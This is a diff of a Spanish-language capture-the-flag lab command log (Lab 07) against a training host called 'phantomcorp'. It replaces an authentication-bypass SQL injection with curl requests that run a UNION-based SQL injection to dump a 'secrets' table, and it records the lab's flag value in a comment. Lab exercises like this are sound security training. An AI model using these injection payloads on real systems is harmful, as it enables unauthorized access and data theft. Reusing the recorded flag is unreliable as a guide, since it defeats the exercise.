@@ -1,6 +1,11 @@
-# Comandos ejecutados desde la consola atacante (cyberlab-attacker), en orden
+# Comandos ejecutados desde cyberlab-attacker para R2 (Lab 07)
+# En esta sesión se invocaron desde el host mediante `docker exec` por indisponibilidad de WSL.
 
-# --- R1: SQL injection, bypass de autenticacion ---
-curl -sS -i -X POST http://phantomcorp/login --data-urlencode 'user=test' --data-urlencode 'pass=test'
-curl -sS -i -X POST http://phantomcorp/login --data-urlencode "user=admin' --" --data-urlencode 'pass=cualquiercosa'
-./ctf submit 07 R1 'FLAG{...}'
+# Línea base de búsqueda.
+curl -sS -i -G http://phantomcorp/buscar --data-urlencode 'q=Router'
+
+# Extracción manual con SQLi UNION.
+curl -sS -i -G http://phantomcorp/buscar --data-urlencode "q=Router' UNION SELECT * FROM secrets -- "
+
+# Pendiente de registrar en una instalación Unix/WSL con finales de línea LF:
+# ./ctf submit 07 R2 'FLAG{sqli_union_dump}'
